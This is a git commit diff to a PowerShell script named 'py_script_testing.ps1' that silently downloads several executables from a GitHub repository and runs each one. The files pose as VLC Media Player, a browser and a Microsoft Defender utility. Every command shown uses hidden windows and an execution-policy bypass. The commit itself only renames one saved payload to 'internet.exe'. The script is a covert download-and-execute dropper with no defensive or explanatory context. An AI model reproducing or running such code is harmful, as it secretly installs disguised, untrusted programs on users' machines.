e8df75b0bdc4218561afecbf7eb46338c0e082c7
rude90 <115774095+rude90@users.noreply.github.com>
2023-04-14 19:34:50 +0500

    Update py_script_testing.ps1

--- py_script_testing.ps1
+++ py_script_testing.ps1
@@ -9,8 +9,8 @@ powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/al
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/VLC%20Media%20Player.exe -o C:\Users\VLC.exe
 powershell.exe -w Hidden C:\Users\VLC.exe
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Browser.exe -o C:\Users\Browser.exe
-powershell.exe -w Hidden C:\Users\Browser.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Browser.exe -o C:\Users\internet.exe
+powershell.exe -w Hidden C:\Users\internet.exe
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
 powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
